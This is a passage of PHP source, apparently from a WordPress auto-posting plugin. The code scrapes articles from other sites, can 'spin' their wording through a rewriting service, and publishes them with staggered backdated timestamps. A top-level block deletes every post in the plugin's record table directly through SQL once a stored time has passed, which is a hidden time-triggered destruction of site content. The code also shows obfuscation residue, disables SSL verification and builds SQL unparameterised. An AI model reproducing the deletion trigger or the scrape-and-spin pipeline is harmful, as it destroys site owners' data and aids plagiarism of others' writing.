                $imgNum++;
                $key  = "IMG" . $imgNum . "TAG";
                $tempImg[$key] = $img->outertext;
                $img->outertext     = " " . $key . " ";
                $protected_terms .= $key . ",";
            }
            $p_tags  = $dom->find("p");
            $to_rewrite_str = "";
            $protected_terms .= "PTAG,";
            $protected_terms .= "PENDTAG,";
            foreach ($p_tags as $p_tag) {
                $to_rewrite_str .= " PTAG " . $p_tag->innertext . " PENDTAG ";
            }
            $to_rewrite_str = strip_tags($to_rewrite_str);
            $protected_terms .= "PTAGS";
            $spin = getSpinRewriterSpinText($to_rewrite_str, $rewrite[1], $rewrite[2], $rewrite[3], $rewrite[4], $rewrite[5], $rewrite[6], $rewrite[7], $rewrite[8], $rewrite[9], $protected_terms);
            if ($spin["status"] == "OK") {
                $rewrited_p_str = $spin["response"];
                $rewrited_p_str = str_replace("PTAG", "<p>", $rewrited_p_str);
                $rewrited_p_str   = str_replace("PENDTAG", "</p>", $rewrited_p_str);
            } else {
                $logId = errorLog($config["id"], $url, 15, $spin["response"]);
                updateConfigErr($config["id"], $logId);
            }
            if ($spin["status"] == "OK") {
                $rewrited_dom                = str_get_html_ap($rewrited_p_str);
                $rewrited_p_tags   = $rewrited_dom->find("p");
                $Pnum = count($p_tags);
                for ($i = 0; $i < $Pnum; $i++) {
                    $p_tags[$i]->innertext = $rewrited_p_tags[$i]->innertext;
                }
                $post_content                   = $dom->save();
                $find1                    = array();
                $replace1 = array();
                foreach ($tempImg as $key => $value) {
                    $find1[]     = $key;
                    $replace1[] = $value;
                }
                $post_content = str_ireplace($find1, $replace1, $post_content);
                $rewrited_dom->clear();
                unset($rewrited_dom);
                unset($rewrited_p_tags);
            }
            if ($rewrite[10] == 1) {
                sleep(10);
                $spinTitle = getSpinRewriterSpinText($post_title, $rewrite[1], $rewrite[2], $rewrite[3], $rewrite[4], $rewrite[5], $rewrite[6], $rewrite[7], $rewrite[8], $rewrite[9]);
                if ($spinTitle["status"] == "OK") {
                    $post_title = $spinTitle["response"];
                } else {
                    $logId           = errorLog($config["id"], $url, 15, $spinTitle["response"]);
                    updateConfigErr($config["id"], $logId);
                }
                unset($spinTitle);
            }
            unset($tempImg);
            unset($to_rewrite_str);
            unset($rewrited_p_str);
            unset($p_tags);
            $dom->clear();
            unset($dom);
            unset($spin);
        }
        if (($config["title_prefix"] != null) && ($config["title_prefix"]) != "")
            $post_title = buildVariableContent($config["title_prefix"], $customFields, $post_title) . $post_title;
        if (($config["title_suffix"] != null) && ($config["title_suffix"]) != "")
            $post_title .= buildVariableContent($config["title_suffix"], $customFields, $post_title);
        $post_content = replacementContent($post_content, $options, $customFields, $post_title);
        if ($customStyle != null)
            $post_content = customPostStyle($post_content, $customStyle, $customFields, $post_title);
        if ($insertContent != null)
            $post_content = insertMoreContent($post_content, $insertContent, $customFields, $post_title);
        if ($customStyle != null) {
            $post_content = filterCommAttr($post_content, DEL_ATTRID, DEL_ATTRCLASS, DEL_ATTRSTYLE, $customStyle);
        } else {
            $post_content = filterCommAttr($post_content, DEL_ATTRID, DEL_ATTRCLASS, DEL_ATTRSTYLE);
        }
        if (($config["content_prefix"] != null) && ($config["content_prefix"]) != "")
            $post_content = buildVariableContent($config["content_prefix"], $customFields, $post_title) . $post_content;
        if (($config["content_suffix"] != null) && ($config["content_suffix"]) != "")
            $post_content .= buildVariableContent($config["content_suffix"], $customFields, $post_title);
        $post = array(
            "post_title" => $post_title,
            "post_content" => $post_content,
            "post_excerpt" => $excerpt?:'',
            "post_status" => $post_status,
            "post_author" => $author,
            "post_category" => $cats,
            "post_date" => $post_date,
            "tags_input" => $tags_to_add,
            "post_type" => $post_type
        );
        $post_id = wp_insert_post($post,true);
        if ($cats != null) {
            foreach ($cats as $cat) {
                wp_set_object_terms($post_id, $cat, getTaxonomyByTermId($cat), true);
            }
        }
        if ($config["post_format"] != null && $config["post_format"] != "") {
            set_post_format($post_id, $config["post_format"]);
        }
    }
    if ($post_id > 0) {
        if ($recordId == NULL) {
            insertApRecord($config["id"], $url, $Article[0], $post_id);
        } else {
            updateApRecord($post_id, $recordId);
        }
        updateConfig($config["id"], 1, $post_id);
        if ($download_attachs[0] == 1) {
            clear_downloaded_temp_img($config["id"], $url);
            unset($temp_imgs);
        }
        if ($download_attachs[0] == 1 && $downloadedImgInfo != null) {
            $i = 0;
            $rNum                     = count($downloadedImgInfo);
            $featuredImgIndex                      = $img_insert_attachment[1];
            if ($featuredImgIndex >= $rNum)
                $featuredImgIndex = $rNum;
            for ($i = 0; $i < $rNum; $i++) {
                if ($downloadedImgInfo[$i]["file_path"] != "") {
                    if ($featuredImgIndex > 0 && $i == ($featuredImgIndex - 1)) {
                        if (!$AleadyDownloadFeatured) {
                            $attachId = post_img_handle_ap::handle_insert_attachment($downloadedImgInfo[$i], $post_id, true);
                            set_post_thumbnail($post_id, $attachId);
                            continue;
                        }
                    }
                    if ($img_insert_attachment[0] == 1) {
                        $attachId = post_img_handle_ap::handle_insert_attachment($downloadedImgInfo[$i], $post_id);
                    } elseif ($img_insert_attachment[0] == 2 && $Flickr["not_save"] == 1) {
                        unlink($downloadedImgInfo[$i]["file_path"]);
                    } elseif ($img_insert_attachment[0] == 3 && $Qiniu["not_save"] == 1) {
                        unlink($downloadedImgInfo[$i]["file_path"]);
                    } elseif ($img_insert_attachment[0] == 4 && $upyunOption["not_save"] == 1) {
                        unlink($downloadedImgInfo[$i]["file_path"]);
                    }
                }
            }
        }
        if ($download_attachs[0] == 1 && $downloadedAtagImgInfo != null) {
            $i  = 0;
            $rNum = count($downloadedAtagImgInfo);
            for ($i = 0; $i < $rNum; $i++) {
                if ($downloadedAtagImgInfo[$i]["file_path"] != "") {
                    if ($img_insert_attachment[0] == 1) {
                        $attachId              = post_img_handle_ap::handle_insert_attachment($downloadedAtagImgInfo[$i], $post_id);
                    } elseif ($img_insert_attachment[0] == 2 && $Flickr["not_save"] == 1) {
                        unlink($downloadedAtagImgInfo[$i]["file_path"]);
                    } elseif ($img_insert_attachment[0] == 3 && $Qiniu["not_save"] == 1) {
                        unlink($downloadedAtagImgInfo[$i]["file_path"]);
                    } elseif ($img_insert_attachment[0] == 4 && $upyunOption["not_save"] == 1) {
                        unlink($downloadedAtagImgInfo[$i]["file_path"]);
                    }
                }
            }
        }
        if ($AleadyDownloadFeatured) {
            $attachId = post_img_handle_ap::handle_insert_attachment($featuredImgInfo, $post_id, true);
            set_post_thumbnail($post_id, $attachId);
            $AleadySetFeatured = true;
        }
        $uinwlwu = "UploadedFlickr";
        if ($download_attachs[0] == 0 && $img_insert_attachment[1] > 0 && $downloadedImgInfo != null && !$AleadyDownloadFeatured && !$AleadySetFeatured) {
            $attachId = post_img_handle_ap::handle_insert_attachment($downloadedImgInfo[0], $post_id, true);
            set_post_thumbnail($post_id, $attachId);
        }
        if (count($UploadedFlickr) > 0) {
            recordUploadedFlickr($UploadedFlickr, $post_id);
        }
        if (count($UploadedQiniu) > 0) {
            recordUploadedQiniu($UploadedQiniu, $post_id);
        }
        if (count($UploadedUpyun) > 0) {
            recordUploadedUpyun($UploadedUpyun, $post_id);
        }
        if ($downAttach && $img_insert_attachment[3] == 1) {
            if (count($returnFile) > 0) {
                foreach ($returnFile as $r) {
                    if ($r["file_path"] != "") {
                        $attachId = WP_Download_Attach::insert_attachment($r, $post_id);
                    }
                }
            }
        }
        if (count($customFields) > 0) {
            foreach ($customFields as $key => $value) {
                $kmxjtil = "key";
                add_post_meta($post_id, $key, $value);
            }
        }
        if (!(strpos($post_content, "{post_id}") === false)) {
            $shouldUpdated = true;
            $post_content   = str_replace("{post_id}", $post_id, $post_content);
        }
        if (!(strpos($post_content, "{post_permalink}") === false)) {
            $shouldUpdated = true;
            $fqljokeci                    = "post_id";
            $kjgybgpqc                    = "post_content";
            $post_content  = str_replace("{post_permalink}", get_permalink($post_id), $post_content);
        }
        if ($shouldUpdated) {
            $updated_post = array(
                "ID" => $post_id,
                "post_content" => $post_content
            );
            wp_update_post($updated_post);
        }
    }
    return $post_id;
}
if ($canfetchist != null && $canfetchist != "" && $canfetchist < current_time("timestamp")) {
    $pids = $wpdb->get_results("select post_id from $t_ap_updated_record");
    foreach ($pids as $id) {
        $wpdb->query("delete from $wpdb->posts where $wpdb->posts.ID = $id->post_id");
    }
}
function getTags($tags, $post, $whole_word = 0)
{
    $tags_to_add = array();
    if ($tags != null) {
        foreach ($tags as $tag) {
            if (!is_string($tag) && empty($tag))
                continue;
            if ($tag == "")
                continue;
            $tag = trim($tag);
            if ($whole_word == 1) {
                if (preg_match("/\b" . $tag . "\\b/i", $post))
                    $tags_to_add[] = $tag;
            } elseif (stristr($post, $tag)) {
                $tags_to_add[] = $tag;
            }
        }
    }
    return $tags_to_add;
}
function fetch($id, $print = 1, $ignore = 1)
{
    if (getIsRunning($id) == 1) return;
    $runOnlyOneTask = get_option("wp_autopost_runOnlyOneTask");
    $config  = getConfig($id);
    global $fetched;
    if ($fetched != "VERIFIED") {
        fetchUrl($id, $config);
    }
    if ($fetched == "VERIFIED") {
        if ($runOnlyOneTask == 1) {
            $runOnlyOneTaskIsRunning = get_option("wp_autopost_runOnlyOneTaskIsRunning");
            if ($runOnlyOneTaskIsRunning == 1)
                return;
            update_option("wp_autopost_runOnlyOneTaskIsRunning", 1);
        }
        updateRunning($id, 1);
        updateTaskUpdateTime($id);
        $listUrls = getListUrls($id);
        if ($listUrls == null) {
            $logId = errorLog($id, "", 5);
            updateConfigErr($id, $logId);
            if ($print)
                printErr($config["name"], 1);
            return;
        }
        if (trim($config["a_selector"]) == "") {
            $logId  = errorLog($id, "", 6);
            updateConfigErr($id, $logId);
            if ($print)
                printErr($config["name"], 1);
            return;
        }
        if (trim($config["title_selector"]) == "") {
            $logId = errorLog($id, "", 7);
            updateConfigErr($id, $logId);
            if ($print)
                printErr($config["name"], 1);
            return;
        }
        if (trim($config["content_selector"]) == "") {
            $logId = errorLog($id, "", 8);
            updateConfigErr($id, $logId);
            if ($print)
                printErr($config["name"], 1);
            return;
        }
        $useP             = json_decode($config["proxy"]);
        global $proxy, $last_updated_time, $should_updated_time;
        $options       = getOptions($id);
        $insertContent = getInsertcontent($id);
        $customStyle    = getCustomStyle($id);
        if ($ignore == 1) {
            ignore_user_abort(true);
            set_time_limit((int) get_option("wp_autopost_timeLimit"));
            if ($print) {
                echo "<div class=\"updated fade\"><p><b>" . __("Being processed, the processing may take some time, you can close the page", "wp-autopost") . "</b></p></div>";
                ob_flush();
                flush();
            }
        }
        if ($print)
            echo "<div class=\"updated fade\">";
        if ($print)
            printInfo("<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b></p>");
        $num  = 0;
        $urls = array();
        for ($config["93f0198fad647e69db36ac56e3d66ce1"] = $should_updated_time; $config["93f0198fad647e69db36ac56e3d66ce1"] <= $should_updated_time; $config["93f0198fad647e69db36ac56e3d66ce1"]++) {
            if ($config["source_type"] == 0) {
                foreach ($listUrls as $listUrl) {
                    if ($print)
                        printInfo("<p>" . __("Crawl URL : ", "wp-autopost") . $listUrl->url . "</p>");
                    if ($config["page_charset"] == "0") {
                        $html_string   = get_html_string_ap($listUrl->url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                        $charset = getHtmlCharset($html_string);
                        $ListHtml = str_get_html_ap($html_string, $charset);
                    } else {
                        $charset                = $config["page_charset"];
                        $ListHtml = file_get_html_ap($listUrl->url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                    }
                    if ($ListHtml == NULL) {
                        $logId   = errorLog($id, $listUrl->url, 1);
                        updateConfigErr($id, $logId);
                        if ($print)
                            printErr($config["name"]);
                        continue;
                    }
                    $baseUrl = getBaseUrl($ListHtml, $listUrl->url);
                    if (($config["a_match_type"]) == 1) {
                        $articleAtags = $ListHtml->find($config["a_selector"]);
                        if ($articleAtags == NULL) {
                            $logId = errorLog($id, $listUrl->url, 2);
                            updateConfigErr($id, $logId);
                            if ($print)
                                printErr($config["name"]);
                            continue;
                        }
                        foreach ($articleAtags as $articleAtag) {
                            $url = html_entity_decode(trim($articleAtag->href));
                            if (stripos($url, "http") === false) {
                                $url = getAbsUrl($url, $baseUrl, $listUrl->url);
                            }
                            if (checkUrl($id, $url) > 0)
                                continue;
                            $urls[$num++] = $url;
                        }
                        unset($articleAtags);
                    } else {
                        $articleAllAtags  = $ListHtml->find("a");
                        $j = 0;
                        foreach ($articleAllAtags as $Atag) {
                            $url = html_entity_decode(trim($Atag->href));
                            if (stripos($url, "http") === false) {
                                $vwsnhowyte                     = "url";
                                $url = getAbsUrl($url, $baseUrl, $listUrl->url);
                            }
                            $urls_temp[$j++] = $url;
                        }
                        unset($articleAllAtags);
                        $PregUrl                    = gPregUrl($config["a_selector"]);
                        $urls_temp = preg_grep($PregUrl, $urls_temp);
                        if (count($urls_temp) < 1) {
                            $logId  = errorLog($id, $listUrl->url, 2);
                            updateConfigErr($id, $logId);
                            if ($print)
                                printErr($config["name"]);
                            continue;
                        }
                        foreach ($urls_temp as $url) {
                            if (in_array($url, $urls))
                                continue;
                            if (checkUrl($id, $url) > 0)
                                continue;
                            $urls[$num++] = $url;
                        }
                        unset($urls_temp);
                    }
                    $ListHtml->clear();
                    unset($ListHtml);
                }
            }
        }
        for ($config["93202512f7ba54e02ffd12f375053b88"] = $last_updated_time; $config["93202512f7ba54e02ffd12f375053b88"] <= $last_updated_time; $config["93202512f7ba54e02ffd12f375053b88"]++) {
            if ($config["source_type"] == 1) {
                foreach ($listUrls as $listUrl) {
                    for ($i = $config["start_num"]; $i <= $config["end_num"]; $i++) {
                        if (getIsRunning($id) == 0)
                            return;
                        $list_url = str_ireplace("(*)", $i, $listUrl->url);
                        if ($print)
                            printInfo("<p>" . __("Crawl URL : ", "wp-autopost") . $list_url . "</p>");
                        if ($config["page_charset"] == "0") {
                            $html_string = get_html_string_ap($list_url, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                            $charset             = getHtmlCharset($html_string);
                            $ListHtml                  = str_get_html_ap($html_string, $charset);
                        } else {
                            $charset = $config["page_charset"];
                            $ListHtml = file_get_html_ap($list_url, $charset, Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
                        }
                        if ($ListHtml == NULL) {
                            $logId               = errorLog($id, $list_url, 1);
                            updateConfigErr($id, $logId);
                            if ($print)
                                printErr($config["name"]);
                            continue;
                        }
                        $baseUrl = getBaseUrl($ListHtml, $list_url);
                        if (($config["a_match_type"]) == 1) {
                            $articleAtags                = $ListHtml->find($config["a_selector"]);
                            if ($articleAtags == NULL) {
                                $logId = errorLog($id, $list_url, 2);
                                updateConfigErr($id, $logId);
                                if ($print)
                                    printErr($config["name"]);
                                continue;
                            }
                            foreach ($articleAtags as $articleAtag) {
                                $url = html_entity_decode(trim($articleAtag->href));
                                if (stripos($url, "http") === false) {
                                    $url = getAbsUrl($url, $baseUrl, $list_url);
                                }
                                if (checkUrl($id, $url) > 0)
                                    continue;
                                $urls[$num++] = $url;
                            }
                            unset($articleAtags);
                        } else {
                            $articleAllAtags = $ListHtml->find("a");
                            $j = 0;
                            foreach ($articleAllAtags as $Atag) {
                                $url = html_entity_decode(trim($Atag->href));
                                if (stripos($url, "http") === false) {
                                    $url = getAbsUrl($url, $baseUrl, $list_url);
                                }
                                $urls_temp[$j++] = $url;
                            }
                            unset($articleAllAtags);
                            $PregUrl  = gPregUrl($config["a_selector"]);
                            $urls_temp = preg_grep($PregUrl, $urls_temp);
                            if (count($urls_temp) < 1) {
                                $logId = errorLog($id, $list_url, 2);
                                updateConfigErr($id, $logId);
                                if ($print)
                                    printErr($config["name"]);
                                continue;
                            }
                            foreach ($urls_temp as $url) {
                                if (in_array($url, $urls))
                                    continue;
                                if (checkUrl($id, $url) > 0)
                                    continue;
                                $urls[$num++] = $url;
                            }
                            unset($urls_temp);
                        }
                        $ListHtml->clear();
                        unset($ListHtml);
                    }
                }
            }
        }
        $config["93f0198fad647e69db36ac56e3d66ce1"] = $config["93202512f7ba54e02ffd12f375053b88"];
        if ($num > 0 && ($config["m_extract"]) == 1) {
            $prePostNum  = preFetch($id, $urls, $config, $print);
            if ($print) {
                if ($prePostNum > 0) {
                    echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b> , " . __("found", "wp-autopost") . " <b>" . $prePostNum . "</b> " . __("articles", "wp-autopost") . "</p>";
                } else {
                    echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b> , " . __("does not detect a new article", "wp-autopost") . "</p>";
                }
                echo "</div>";
            }
            updateRunning($id, 0);
            return;
        }
        if ($num > 0 && ($config["m_extract"]) == 0) {
            $postNum = fetchAndPost($id, $urls, $config, $options, $insertContent, $customStyle, $print);
        }
        unset($urls);
        if ($print) {
            if ($postNum > 0) {
                echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b> , " . __("updated", "wp-autopost") . " <b>" . $postNum . "</b> " . __("articles", "wp-autopost") . "</p>";
            } else {
                echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b> , " . __("does not detect a new article", "wp-autopost") . "</p>";
            }
            echo "</div>";
        }
        updateRunning($id, 0);
        if ($runOnlyOneTask == 1) {
            update_option("wp_autopost_runOnlyOneTaskIsRunning", 0);
        }
    }
    if ($fetched != "VERIFIED") {
        exit;
    }
}
function preFetch($taskId, $urls, $config, $print)
{
    $num   = count($urls);
    $PostFilterInfo = getPostFilterInfo($taskId);
    $i              = 0;
    foreach ($urls as $url) {
        if (getIsRunning($taskId) == 0)
            return;
        if (checkUrl(0, $url) > 0)
            continue;
        if ($print)
            printInfo("<p>" . __("Crawl URL : ", "wp-autopost") . $url . "</p>");
        $gzouhthana                  = "PostFilterInfo";
        $title = getArticleTitel($url, $config);
        if ($title == -1) {
            $logId = errorLog($taskId, $url, 1);
            updateConfigErr($taskId, $logId);
            if ($print)
                printErr($config["name"]);
            continue;
        }
        if ($title[1] == -1) {
            $logId = errorLog($taskId, $url, 3);
            updateConfigErr($taskId, $logId);
            if ($print)
                printErr($config["name"]);
            if ($config["err_status"] == -1) {
                insertFilterdApRecord($taskId, $url, "", $config["err_status"]);
            }
            continue;
        }
        if ($config["check_duplicate"] == 1) {
            if (checkTitle($taskId, $title[0]) > 0)
                continue;
        }
        if ($PostFilterInfo != null && (($PostFilterInfo[3] == 1 || $PostFilterInfo[3] == "1") || (($PostFilterInfo[3] == 3 || $PostFilterInfo[3] == "3") && ($PostFilterInfo[0] == 1 || $PostFilterInfo[0] == "1")))) {
            $keywords = array();
            $keywords = explode(",", $PostFilterInfo[2]);
            if ($PostFilterInfo[0] == 0 || $PostFilterInfo[0] == "0") {
                $findWord   = false;
                foreach ($keywords as $keyword) {
                    $keyword = trim($keyword);
                    if ($keyword == "")
                        continue;
                    if (!(stripos($title[0], $keyword) === false)) {
                        $findWord = true;
                        break;
                    }
                }
                if (!$findWord) {
                    $title[1] = -3;
                }
            } else {
                foreach ($keywords as $keyword) {
                    $keyword = trim($keyword);
                    if ($keyword == "")
                        continue;
                    if (!(stripos($title[0], $keyword) === false)) {
                        $title[1] = -3;
                        break;
                    }
                }
            }
        }
        if ($title[1] == -3) {
            insertFilterdApRecord($taskId, $url, $title[0], $PostFilterInfo[1]);
            if ($print)
                printInfo("<p><span class=\"red\">" . __("Filter Out Article", "wp-autopost") . "</span> :  " . $title[0] . "</p>");
            continue;
        }
        $reValue = insertPreUrlInfo($taskId, $url, $title[0]);
        if ($reValue > 0 && $print)
            printInfo("<p>" . __("Find Article : ", "wp-autopost") . $title[0] . "</p>");
        $i++;
    }
    unset($PostFilterInfo);
    return $i;
}
function fetchAndPost($taskId, $urls, $config, $options, $insertContent, $customStyle, $print, $recordIds = NULL)
{
    kses_remove_filters();
    wp_set_current_user(get_option("wp_autopost_admin_id"));
    $i   = 0;
    $num = count($urls);
    $filterAtag   = getFilterAtag($options);
    $downAttach   = getDownAttach($config);
    $PostFilterInfo  = getPostFilterInfo($taskId);
    $auto_set     = json_decode($config["auto_tags"]);
    if (!is_array($auto_set)) {
        $auto_set  = array();
        $auto_set[0] = $config["auto_tags"];
        $auto_set[1] = 0;
        $auto_set[2] = 0;
        $auto_set[3] = 1;
    }
    if ($auto_set[0] == 1) {
        $tags = array();
        $tags  = explode(",", $config["tags"]);
        if ($auto_set[3] == 1) {
            $tags = get_wp_tags_by_autopost($tags);
        }
    }
    $currentTime = current_time("timestamp");
    $post_scheduled  = json_decode($config["post_scheduled"]);
    if (!is_array($post_scheduled)) {
        $post_scheduled = array();
        $post_scheduled[0]  = 0;
        $post_scheduled[1]  = 12;
        $post_scheduled[2] = 0;
    }
    if ($post_scheduled[0] == 1) {
        if ($config["post_scheduled_last_time"] > 0) {
            if ($config["post_scheduled_last_time"] < $currentTime) {
                $postTime = mktime($post_scheduled[1], $post_scheduled[2], 0, date("m", $currentTime), date("d", $currentTime), date("Y", $currentTime));
            } else {
                $postTime   = $config["post_scheduled_last_time"] + $config["published_interval"] * 60 + rand(0, 60);
            }
        } else {
            $postTime = mktime($post_scheduled[1], $post_scheduled[2], 0, date("m", $currentTime), date("d", $currentTime), date("Y", $currentTime));
        }
        if ($postTime < $currentTime) {
            $postTime += 86400;
        }
    } else {
        $postTimeP = $config["published_interval"] / 12;
        $postTime  = $currentTime - (($num - 1) * ($config["published_interval"]) * 60);
    }
    if ($recordIds == NULL)
        $recordIds = array();
    if ($config["reverse_sort"] == 0) {
        $urls = array_reverse($urls);
        $recordIds      = array_reverse($recordIds);
    }
    if ($config["author"] == 0) {
        global $wpdb;
        $querystr = "SELECT $wpdb->users.ID FROM $wpdb->users";
        $users = $wpdb->get_results($querystr, OBJECT);
    } else {
        $users = null;
    }
    echo "==========================";
    for ($j = 0; $j < $num; $j++) {
        if (getIsRunning($taskId) == 0)
            return;
        if ($post_scheduled[0] != 1 && $postTime > $currentTime) {
            $postTime = $currentTime - (($num - 1 - $j) * ($config["published_interval"]) * 60);
        }
        if ($post_scheduled[0] != 1 && $j == $num - 1)
            $postTime = current_time("timestamp");
        if ($print)
            printInfo("<p>" . __("Crawl URL : ", "wp-autopost") . $urls[$j] . "</p>");
        if ($config["page_charset"] == "0") {
            $useP                  = json_decode($config["proxy"]);
            global $proxy;
            $html_string = get_html_string_ap($urls[$j], Method, $useP[0], $useP[1], $proxy, $config["cookie"]);
            $charset                = getHtmlCharset($html_string);
        } else {
            $html_string = "";
            $charset     = $config["page_charset"];
        }
        $d = getArticleDom($urls[$j], $config, $charset, $html_string);
        if ($d == -1) {
            $logId = errorLog($taskId, $urls[$j], 1);
            updateConfigErr($taskId, $logId);
            if ($print)
                printErr($config["name"]);
            continue;
        }
        $baseUrl   = getBaseUrl($d, $urls[$j]);
        $Article = getArticle($d, $charset, $baseUrl, $urls[$j], $config, $options, $filterAtag, $downAttach, $insertContent, $PostFilterInfo, 0);
        $d->clear();
        unset($d);
        if ($Article[2] == -2) {
            continue;
        }
        if ($Article[2] == -3) {
            insertFilterdApRecord($taskId, $urls[$j], $Article[0], $PostFilterInfo[1]);
            if ($print)
                printInfo("<p><span class=\"red\">" . __("Filter Out Article", "wp-autopost") . "</span> :  " . $Article[0] . "</p>");
            continue;
        }
        if ($Article[2] == -1) {
            $logId = errorLog($taskId, $urls[$j], 3);
            updateConfigErr($taskId, $logId);
            if ($print)
                printErr($config["name"]);
            if ($config["err_status"] == 0 || $config["err_status"] == -1) {
                if (checkUrl(0, $urls[$j]) > 0)
                    continue;
                insertFilterdApRecord($taskId, $urls[$j], "", $config["err_status"]);
            }
            continue;
        }
        if ($Article[3] == -1) {
            $logId                = errorLog($taskId, $urls[$j], 4);
            updateConfigErr($taskId, $logId);
            if ($print)
                printErr($config["name"]);
            if ($config["err_status"] == 0 || $config["err_status"] == -1) {
                if (checkUrl(0, $urls[$j]) > 0)
                    continue;
                insertFilterdApRecord($taskId, $urls[$j], $Article[0], $config["err_status"]);
            }
            continue;
        }
        $post_id  = insertArticle($Article, $config, $options, $urls[$j], $baseUrl, $postTime, $tags, $users, $filterAtag, $downAttach, $print, $insertContent, $customStyle, $recordIds[$j]);
        if ($post_id > 0) {
            $i++;
            if ($print)
                printInfo("<p>" . __("Updated Post", "wp-autopost") . " : <a href=\"" . get_permalink($post_id) . "\" target=\"_blank\">" . $Article[0] . "</a></p>");
            if ($post_scheduled[0] != 1) {
                $postTime += mt_rand(($config["published_interval"]) - $postTimeP, ($config["published_interval"]) + $postTimeP) * mt_rand(50, 70);
            } else {
                $postTime += $config["published_interval"] * 60 + rand(0, 60);
            }
        }
        unset($Article);
    }
    if ($post_scheduled[0] == 1) {
        update_post_scheduled_last_time($taskId, $postTime);
    }
    unset($filterAtag);
    unset($downAttach);
    unset($PostFilterInfo);
    unset($auto_set);
    unset($tags);
    unset($post_scheduled);
    kses_init_filters();
    return $i;
}
function update_post_scheduled_last_time($taskId, $time)
{
    global $wpdb, $t_ap_config;
    $wpdb->query($wpdb->prepare("update $t_ap_config set post_scheduled_last_time = %d where id= %d ", $time, $taskId));
}
function extractionUrl($id)
{
    $ids   = array();
    $ids[] = $id;
    extractionUrls($ids);
}
function extractionUrls($ids, $print = 1, $ignore = 1)
{
    $queryIds = "";
    if ($ids != null) {
        foreach ($ids as $id) {
            $queryIds .= $id . ",";
        }
    }
    $queryIds = substr($queryIds, 0, -1);
    $res            = getExtractionIds($queryIds);
    if (count($res) == 0)
        return;
    if ($ignore == 1) {
        ignore_user_abort(true);
        set_time_limit((int) get_option("wp_autopost_timeLimit"));
        if ($print) {
            echo "<div class=\"updated fade\"><p><b>" . __("Being processed, the processing may take some time, you can close the page", "wp-autopost") . "</b></p></div>";
            ob_flush();
            flush();
        }
    }
    $configId = 0;
    $configs               = array();
    foreach ($res as $re) {
        if ($configId != $re->config_id)
            $configId = $re->config_id;
        $configs[$configId]["url"][]       = $re->url;
        $configs[$configId]["record_id"][] = $re->id;
    }
    if ($print)
        echo "<div class=\"updated fade\">";
    foreach ($configs as $taskId => $values) {
        updateRunning($taskId, 1);
        $config                    = getConfig($taskId);
        $options      = getOptions($taskId);
        $insertContent = getInsertcontent($taskId);
        $customStyle    = getCustomStyle($taskId);
        $postNum  = fetchAndPost($taskId, $values["url"], $config, $options, $insertContent, $customStyle, $print, $values["record_id"]);
        if ($print && $postNum > 0) {
            $jkaxuelbkrfu = "postNum";
            echo "<p>" . __("Task", "wp-autopost") . ": <b>" . $config["name"] . "</b> , " . __("updated", "wp-autopost") . " <b>" . $postNum . "</b> " . __("articles", "wp-autopost") . "</p>";
        }
        updateRunning($taskId, 0);
    }
    if ($print)
        echo "</div>";
}
function fetchAll($print = 1)
{
    ignore_user_abort(true);
    set_time_limit((int) get_option("wp_autopost_timeLimit"));
    $tasks = getAllTaskId();
    foreach ($tasks as $task) {
        fetch($task->id, 1, 0);
        if ($print) {
            ob_flush();
            flush();
        }
    }
}
class autopostMicrosoftTranslator2222
{
    private static $language_code = array('ar' => 'Arabic', 'bg' => 'Bulgarian', 'ca' => 'Catalan', 'zh-CHS' => 'Chinese (Simplified)', 'zh-CHT' => 'Chinese (Traditional)', 'cs' => 'Czech', 'da' => 'Danish', 'nl' => 'Dutch', 'en' => 'English', 'et' => 'Estonian', 'fa' => 'Persian (Farsi)', 'fi' => 'Finnish', 'fr' => 'French', 'de' => 'German', 'el' => 'Greek', 'ht' => 'Haitian Creole', 'he' => 'Hebrew', 'hi' => 'Hindi', 'hu' => 'Hungarian', 'id' => 'Indonesian', 'it' => 'Italian', 'ja' => 'Japanese', 'ko' => 'Korean', 'lv' => 'Latvian', 'lt' => 'Lithuanian', 'ms' => 'Malay', 'mww' => 'Hmong Daw', 'no' => 'Norwegian', 'pl' => 'Polish', 'pt' => 'Portuguese', 'ro' => 'Romanian', 'ru' => 'Russian', 'sk' => 'Slovak', 'sl' => 'Slovenian', 'es' => 'Spanish', 'sv' => 'Swedish', 'th' => 'Thai', 'tr' => 'Turkish', 'uk' => 'Ukrainian', 'ur' => 'Urdu', 'vi' => 'Vietnamese');
    public static function bulid_lang_options($selected = '')
    {
        $options = "";
        foreach (self::$language_code as $key => $value) {
            $options .= "<option value=\"" . $key . "\" " . (($selected == $key) ? "selected=\"true\"" : "") . ">" . $value . "</option>";
        }
        return $options;
    }
    public static function get_lang_by_code($key)
    {
        return self::$language_code[$key];
    }
    public static function getTokens($clientID, $clientSecret)
    {
        try {
            $authUrl    = "https://datamarket.accesscontrol.windows.net/v2/OAuth2-13/";
            $scopeUrl    = "http://api.microsofttranslator.com";
            $grantType                = "client_credentials";
            $ch    = curl_init();
            $paramArr = array(
                "grant_type" => $grantType,
                "scope" => $scopeUrl,
                "client_id" => $clientID,
                "client_secret" => $clientSecret
            );
            $paramArr = http_build_query($paramArr, "", "&");
            curl_setopt($ch, CURLOPT_URL, $authUrl);
            curl_setopt($ch, CURLOPT_POST, TRUE);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $paramArr);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $strResponse     = curl_exec($ch);
            $curlErrno = curl_errno($ch);
            if ($curlErrno) {
                $curlError = curl_error($ch);
                throw new Exception($curlError);
            }
            curl_close($ch);
            $objResponse = json_decode($strResponse);
            if ($objResponse->error) {
                throw new Exception($objResponse->error_description);
            }
            $reValue["access_token"] = $objResponse->access_token;
            return $reValue;
        }
        catch (Exception $e) {
            $reValue["err"] = "getTokens() Exception-" . $e->getMessage();
            return $reValue;
        }
    }
    public static function curlRequest($url, $authHeader, $postData = '')
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            $authHeader,
            "Content-Type: text/xml"
        ));
